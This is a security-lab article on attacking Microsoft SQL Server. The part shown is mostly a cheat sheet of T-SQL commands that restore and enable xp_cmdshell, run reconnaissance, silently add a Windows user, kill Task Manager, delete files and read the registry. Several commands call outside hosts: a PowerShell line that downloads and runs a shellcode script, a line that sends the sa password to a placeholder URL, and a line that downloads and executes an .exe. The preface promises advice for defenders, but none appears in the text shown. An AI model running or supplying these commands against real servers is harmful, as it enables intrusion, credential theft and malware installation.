**作者：Tahir@深信服千里目安全实验室  
原文链接：**
## 前言
一年一度的网络安全建设成果检验即将开始，在网络安全实战攻防演练这场最关键的战役中，办公应用系统、Web中间件，数据库等是攻击方主要的攻击对象，由于使用量最大，数据库往往会成为攻击者的首选目标之一。以微软SQL
Server为例，除了常见的SQL注入漏洞，攻击方还会用一些“出其不意”的招式，将SQL
Server原本的优势转变为攻击的突破口，比如在相应的权限下，攻击者可以利用SQL Server强大的存储过程执行不同的高级功能，通过增加SQL
Server数据库用户，权限维持等方式，攻击用户数据库系统，下文将详述攻击方那些“不常见”的数据库攻击手段以及防守方的应对思路。
## SQL Server概述
SQL Server是Microsoft开发的关系数据库管理系统（RDBMS）。 它是市场上最受欢迎的DBMS之一。SQL
Server具有极其广泛的用途，它可以在各个方面使用,从存储个人博客的内容到存储客户数据等。
在2017版之前，SQL Server仅适用于Windows。 SQL Server
2017中最大的变化之一是，它现在可在Linux和Docker容器上使用。 这意味着可以在Mac上运行SQL Server。
SQL Server的可用版本
版本 | 描述  
---|---  
Enterprise Edition | 此版本仅在Windows Server操作系统上运行。
适用于对速度和可用性具有较高优先级的大型生产数据库服务器。提供复制和联机分析过程（OLAP）服务等功能，这些服务可能会增加其安全风险。  
Standard Edition | 该版本与Enterprise Edition相似，但缺少虚拟接口系统局域网（VI SAN）支持和某些高级OLAP功能。  
Personal Edition | 它旨在用于工作站和便携式计算机，而不是服务器。 其设计最多支持五个数据库用户。  
Developer Edition | 面向开发人员版本，它与Enterprise Edition具有相似的功能，但并不意味着可以在真实的生产环境中运行。  
### 客户端/服务器数据库系统
SQL Server是一个客户端/服务器数据库管理系统（DBMS）。 这允许有许多不同的客户端同时，全部连接到SQL Server。
这些客户端的每一个都可以通过不同的工具进行连接。
例如，一个客户端可能使用如SQL Server Management
Studio（SSMS）之类的图形工具，而另一客户端可能使用诸如sqlcmd之类的命令行工具。 同时，网站也可以从Web应用程序连接到SQL Server。
并且可能有许多其他客户端都使用自己的工具出于自己的目的进行连接。
客户端/服务器DBMS的主要优点是多个用户可以同时访问它，每个用户都有特定的访问级别。如果数据库管理员配置对应的权限，则任何连接到SQL
Server的客户端将只能访问他们被允许访问的数据库。 他们只能执行允许执行的任务。 所有这些都从SQL Server本身内部进行控制。
SQL Server是在服务帐户的上下文中在操作系统上运行的一组Windows服务。每次安装SQL
Server实例时，实际上都会安装一组Windows服务并具有唯一的名称。现有的SQL Server帐户类型：
  * Windows帐户。
  * SQL Server登录名（SQL Server内部）。
  * 数据库用户（SQL Server内部）。
Windows帐户和SQL Server登录名用于登录SQL Server。除非系统管理员，否则必须将SQL
Server登录名映射到数据库用户才能访问数据。数据库用户是在数据库级别内单独创建的。
SQL Server的常见角色是：
  * Sysadmin角色：SQL Server管理员。
  * Public角色：最低特权，类似于Windows中的everyone组。
  * 更多请参考：
### TDS协议
表格数据流（Tabular Data Stream, TDS）协议是一种数据库服务器和客户端间交互的应用层协议，为微软SQL
Server数据库和Sybase公司数据库产品所采用。
**TDS Version** | **Supported Products**  
---|---  
4.2 | Sybase SQL Server = 10  
7.0 | Microsoft SQL Server 7.0  
7.1 | Microsoft SQL Server 2000  
7.2 | Microsoft SQL Server 2005  
详细的协议结构分析，请参考：
## **注意这些“突破口”，可能会被攻击方利用**
下面先简单介绍SQL Server一些常用的攻击面的利用方式。
### SQL Server危险的存储过程
#### xp_cmdshell
**查询xp_cmdshell存储过程是否存在**
xtype为对象类型，xtype='x'，表示存储过程的对象类型为扩展存储过程。
    select * from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
TSQL代码判断是否开启xp_cmdshell
    declare @RunningOnACluster char(1)
    declare @xp_cmdshell_available char(1)
    declare @result int 
    set @xp_cmdshell_available='Y' 
    set @result=0
    select @RunningOnACluster=case 
    when convert(int, serverproperty('IsClustered')) = 1 then 'Y'
    else 'N' 
    end 
    if(0=(select value_in_use from sys.configurations where name='xp_cmdshell'))
        set @xp_cmdshell_available='N' if @RunningOnACluster='Y' 
    begin
        if @xp_cmdshell_available='Y'
            select @result=1
        if @xp_cmdshell_available='N'
            select @result=2
    end
    select @result
**恢复xp_cmdshell存储过程**
解决Error Message:未能找到存储过程 ‘master..xp_cmdshell’。
第一步先删除：
    drop procedure sp_addextendedproc
    drop procedure sp_oacreate
    exec sp_dropextendedproc 'xp_cmdshell'
第二步恢复：
    dbcc addextendedproc("sp_oacreate","odsole70.dll")
    dbcc addextendedproc("xp_cmdshell"," ")
直接恢复，不管sp_addextendedproc是不是存在，需要自行上传xplog70.dll，恢复扩展存储过过程xp_cmdshell的语句:
    dbcc addextendedproc("xp_cmdshell","xplog70.dll")
代码判断一系列存储过程是否存在，若不存在则恢复。
    if not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_cmdshell]'))
    dbcc addextendedproc ('xp_cmdshell','xplog70.dll')
    if not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_dirtree]'))
    dbcc addextendedproc ('xp_dirtree','xpstar.dll')
    if not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_fixeddrives]'))
    dbcc addextendedproc ('xp_fixeddrives','xpstar.dll')
    if not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_regwrite]'))
    dbcc addextendedproc ('xp_regwrite','xpstar.dll')
    if not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_regread]'))
    dbcc addextendedproc ('xp_regread','xpstar.dll')
**开启xp_cmdshell存储过程**
    EXEC sp_configure 'show advanced options', 1; RECONFIGURE; exec SP_CONFIGURE 'xp_cmdshell', 1; RECONFIGURE;
**关闭xp_cmdshell存储过程**
关闭xp_cmdshell配置
    EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE;
删除xp_cmdshell的语句:
    exec sp_dropextendedproc 'xp_cmdshell';
删除xp_cmdshell过程，再添加xp_cmdshell过程，需要自行上传xplog70.dll恢复被删除的xp_cmdshell。
    drop procedure xp_cmdshell;
    exec sp_addextendedproc "xp_cmdshell", "xplog70.dll";
附录
    exec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'
    exec sp_addextendedproc xp_enumgroups ,@dllname ='xplog70.dll'
    exec sp_addextendedproc xp_loginconfig ,@dllname ='xplog70.dll'
    exec sp_addextendedproc xp_enumerrorlogs ,@dllname ='xpstar.dll'
    exec sp_addextendedproc xp_getfiledetails ,@dllname ='xpstar.dll'
    exec sp_addextendedproc Sp_OACreate ,@dllname ='odsole70.dll'
    exec sp_addextendedproc Sp_OADestroy ,@dllname ='odsole70.dll'
    exec sp_addextendedproc Sp_OAGetErrorInfo ,@dllname ='odsole70.dll'
    exec sp_addextendedproc Sp_OAGetProperty ,@dllname ='odsole70.dll'
    exec sp_addextendedproc Sp_OAMethod ,@dllname ='odsole70.dll'
    exec sp_addextendedproc Sp_OASetProperty ,@dllname ='odsole70.dll'
    exec sp_addextendedproc Sp_OAStop ,@dllname ='odsole70.dll'
    exec sp_addextendedproc xp_regaddmultistring ,@dllname ='xpstar.dll'
    exec sp_addextendedproc xp_regdeletekey ,@dllname ='xpstar.dll'
    exec sp_addextendedproc xp_regdeletevalue ,@dllname ='xpstar.dll'
    exec sp_addextendedproc xp_regenumvalues ,@dllname ='xpstar.dll'
    exec sp_addextendedproc xp_regremovemultistring ,@dllname ='xpstar.dll'
    exec sp_addextendedproc xp_regwrite ,@dllname ='xpstar.dll'
    exec sp_addextendedproc xp_dirtree ,@dllname ='xpstar.dll'
    exec sp_addextendedproc xp_regread ,@dllname ='xpstar.dll'
    exec sp_addextendedproc xp_fixeddrives ,@dllname ='xpstar.dll'
**xp_cmdshell执行系统命令**
**xp_cmdshell执行whoami命令**
    exec master.dbo.xp_cmdshell 'whoami'
    exec master.dbo.xp_cmdshell "whoami"
    exec xp_cmdshell "whoami";
**xp_cmdshell执行ipconfig/all命令**
    exec master..xp_cmdshell 'ipconfig/all'
**查询操作系统和版本信息（分别对应中英文系统）**
    exec master..xp_cmdshell 'systeminfo | findstr /B /C:"OS Name" /C:"OS Version"'
    exec master..xp_cmdshell 'systeminfo | findstr /B /C:"OS 名称" /C:"OS 版本"'
**通过xp_cmdshell执行wmic 获取系统信息**
    exec master..xp_cmdshell 'wmic cpu get name,NumberOfCores,NumberOfLogicalProcessors/Format:List'
**调用reg query注册表键值判断RDP服务的端口号**
    exec master..xp_cmdshell 'reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber'
**通过xp_cmdshell执行添加testuser1用户并且不输出结果**
    exec master..xp_cmdshell 'Net user testuser1 passwd1 /workstations:* /times:all /passwordchg:yes /passwordreq:yes /active:yes /add',NO_OUTPUT
**通过xp_cmdshell删除testuser1用户并且不输出结果**
    EXEC master..xp_cmdshell 'net user testuser1/delete', NO_OUTPUT
通过xp_cmdshell执行taskkill
杀死taskmgr.exe，taskmgr.exe用于任务管理器。它显示系统中正在运行的进程。该程序使用Ctrl+Alt+Del（一般是弹出Windows安全再点击“任务管理器”）或者Ctrl+Shift+Esc打开，这不是纯粹的系统程序，但是如果终止它，可能会导致不可知的问题。
    exec master.dbo.xp_cmdshell 'taskkill /f /im taskmgr.exe';
**调用xp_cmdshell执行mkdir命令创建目录**
    exec master..xp_cmdshell 'mkdir "C:\test\" '
**通过xp_cmdshell执行dir命令**
    exec master..xp_cmdshell 'dir c:\'
    exec xp_cmdshell 'dir c:\'
**通过xp_cmdshell删除文件**
    exec master..xp_cmdshell 'del C:\test';
**xp_cmdshell调用Powershell**
通过xp_cmdshell调用powershell
下载
    exec xp_cmdshell 'powershell -c "iex((new-object Net.WebClient).DownloadString(''http://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1''))"'
调用xp_cmdshell执行echo CreateObject最后写入C:/ProgramData/vget.vbs文件
    exec master..xp_cmdshell 'echo Set x= CreateObject(^"Microsoft.XMLHTTP^"):x.Open ^"GET^",LCase(WScript.Arguments(0)),0:x.Send():Set s = CreateObject(^"ADODB.Stream^"):s.Mode = 3:s.Type = 1:s.Open():s.Write(x.responseBody):s.SaveToFile LCase(WScript.Arguments(1)),2 > C:/ProgramData/vget.vbs'; 
通过xp_cmdshell调用cmd.exe 执行powershell 调用OpenRead方法向数据库发送登录用户名sa密码
    exec xp_cmdshell 'powershell (new-object System.Net.WebClient).OpenRead(''http://example/test.jsp?data=127.0.0.1%7c1433%7csa%7cDb123456'')'
通过xp_cmdshell调用powershell下载test0.exe后并执行
    exec master..xp_cmdshell '"echo $client = New-Object System.Net.WebClient > %TEMP%\test.ps1 & echo $client.DownloadFile("http://example/test0.exe","%TEMP%\test.exe") >> %TEMP%\test.ps1 & powershell  -ExecutionPolicy Bypass  %temp%\test.ps1 & WMIC process call create "%TEMP%\test.exe""'
#### xp_regread
SQL
Server存在一系列的存储过程，可以对注册表进行增删改查。xp_regread、xp_regwrite、xp_regdeletvalue、xp_regdeletkey、xp_regaddmultistring等。
**读注册表**
    exec xp_regread 'HKEY_current_user','Control Panel\International','sCountry'
    exec xp_regread N'HKEY_LOCAL_MACHINE', N'SYSTEM\CurrentControlSet\Services\MSSEARCH'
**枚举可用的注册表键值**
    exec xp_regenumkeys 'HKEY_CURRENT_USER','Control Panel\International'